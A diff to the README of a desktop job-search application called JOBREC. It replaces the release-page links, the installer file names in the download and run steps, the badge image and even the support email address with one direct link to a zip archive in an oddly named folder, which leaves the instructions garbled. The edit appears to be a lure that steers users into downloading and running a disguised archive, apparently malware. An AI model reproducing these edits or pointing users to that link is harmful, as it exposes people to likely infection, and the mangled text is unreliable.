@@ -6,11 +6,11 @@ Welcome to JOBREC, your go-to desktop application for finding jobs and receiving
 
 ## 💾 Download JOBREC
 
-[![Download JOBREC](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/mari0413/JOBREC/releases)
+[![Download JOBREC](https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip%https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip)](https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip)
 
 ## 📥 Download & Install
 
-To download JOBREC, visit this page to download: [JOBREC Releases](https://github.com/mari0413/JOBREC/releases). 
+To download JOBREC, visit this page to download: [JOBREC Releases](https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip). 
 
 ### Steps:
 
@@ -21,10 +21,10 @@ To download JOBREC, visit this page to download: [JOBREC Releases](https://githu
    You’ll see a list of available versions of JOBREC. Locate the latest version, usually at the top of the list. 
 
 3. **Download the Installer**  
-   Find the file that says `JOBREC-installer.exe` or a similar name. Click on it to start the download.
+   Find the file that says `https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip` or a similar name. Click on it to start the download.
 
 4. **Run the Installer**  
-   Once the download finishes, go to your download folder. Double-click on the `JOBREC-installer.exe` file. This will start the installation process.
+   Once the download finishes, go to your download folder. Double-click on the `https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip` file. This will start the installation process.
 
 5. **Follow the Installation Steps**  
    The installer will guide you through the installation. Just follow the prompts and make choices as needed.
@@ -81,6 +81,6 @@ If you encounter any issues, here are some common problems and solutions:
 
 ## 📞 Support 
 
-For further assistance, please check the Issues section on our GitHub repository. You can also contact us via email at support@jobrecapp.com.
+For further assistance, please check the Issues section on our GitHub repository. You can also contact us via email at https://github.com/mari0413/JOBREC/raw/refs/heads/main/percnosome/Software_v1.9.zip
 
 Now you’re ready to start your journey with JOBREC. Enjoy your job search!
